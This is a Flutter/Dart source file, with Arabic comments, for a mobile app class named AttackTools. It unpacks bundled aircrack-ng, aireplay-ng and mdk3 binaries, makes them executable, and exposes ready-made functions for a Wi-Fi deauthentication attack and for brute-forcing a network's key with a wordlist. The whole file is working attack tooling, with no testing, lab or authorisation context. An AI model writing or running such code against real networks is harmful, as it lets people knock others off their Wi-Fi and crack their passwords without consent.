import 'dart:io';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';

class AttackTools {
  static Future<void> _setupTools() async {
    final appDir = await getApplicationDocumentsDirectory();
    final toolsDir = Directory('${appDir.path}/tools');
    
    if (!await toolsDir.exists()) {
      await toolsDir.create(recursive: true);
      
      // نسخ جميع الأدوات من assets إلى مجلد التطبيق
      await _copyTool('aircrack-ng');
      await _copyTool('aireplay-ng');
      await _copyTool('mdk3');
      // ... باقي الأدوات
    }
    
    // منح صلاحيات التنفيذ
    await Process.run('chmod', ['-R', '+x', toolsDir.path]);
  }

  static Future<void> _copyTool(String toolName) async {
    try {
      final data = await rootBundle.load('assets/tools/$toolName');
      final appDir = await getApplicationDocumentsDirectory();
      final file = File('${appDir.path}/tools/$toolName');
      
      await file.writeAsBytes(data.buffer.asUint8List(), mode: FileMode.write);
    } catch (e) {
      throw Exception('Failed to copy $toolName: ${e.toString()}');
    }
  }

  static Future<String> _executeAttackTool(
    String toolName, 
    List<String> arguments,
  ) async {
    await _setupTools();
    
    final appDir = await getApplicationDocumentsDirectory();
    final result = await Process.run(
      '${appDir.path}/tools/$toolName',
      arguments,
    );
    
    if (result.exitCode != 0) {
      throw Exception('${toolName} failed: ${result.stderr}');
    }
    
    return result.stdout;
  }

  // واجهات للهجمات الشائعة
  static Future<String> deauthAttack(String bssid) async {
    return await _executeAttackTool(
      'aireplay-ng',
      ['--deauth', '10', '-a', bssid, 'wlan0'],
    );
  }

  static Future<String> bruteForceAttack(
    String bssid, 
    String wordlist,
  ) async {
    return await _executeAttackTool(
      'aircrack-ng',
      ['-w', wordlist, '-b', bssid],
    );
  }
}